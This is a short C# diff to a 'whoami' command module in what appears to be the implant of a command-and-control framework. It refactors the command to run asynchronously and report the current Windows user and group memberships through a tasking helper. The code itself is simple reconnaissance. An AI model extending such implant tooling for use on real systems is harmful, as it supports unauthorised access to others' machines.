@@ -1,4 +1,5 @@
 ﻿using Engineer.Commands;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Generic;
@@ -13,7 +14,7 @@ namespace Engineer.Commands
     {
         public override string Name => "whoami";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             var identity = WindowsIdentity.GetCurrent();
             string Username = identity.Name;
@@ -23,10 +24,10 @@ namespace Engineer.Commands
                 {
                     var groups = identity.Groups;
                     var groupNames = groups.Select(g => g.Value);
-                    return $"{Username} is a member of the following groups: {string.Join(", ", groupNames)}";
+                    Tasking.FillTaskResults($"{Username} is a member of the following groups: {string.Join(", ", groupNames)}", task, EngTaskStatus.Complete);
                 }
             }
-            return $"{Username}";
+            Tasking.FillTaskResults($"{Username}", task, EngTaskStatus.Complete);
         }
     }
 }
